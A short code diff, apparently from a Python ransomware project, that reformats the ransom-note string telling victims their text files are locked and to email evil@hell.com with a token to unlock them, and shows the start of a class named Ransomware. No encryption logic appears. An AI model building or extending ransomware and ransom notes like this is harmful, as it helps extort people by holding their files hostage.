@@ -26,12 +26,10 @@ ENCRYPT_MESSAGE = """
  *           Your precious and useful txt files have been locked.      *
  *                                                                     *
  *                Send an email to evil@hell.com with title            *
- *                   '{token}'                                         *
- *                                                                     *
+                     '{token}'                                         
+                                                                      
  *                                                                     *
  * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
-
-Your precious and useful txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
 """
 class Ransomware:
 
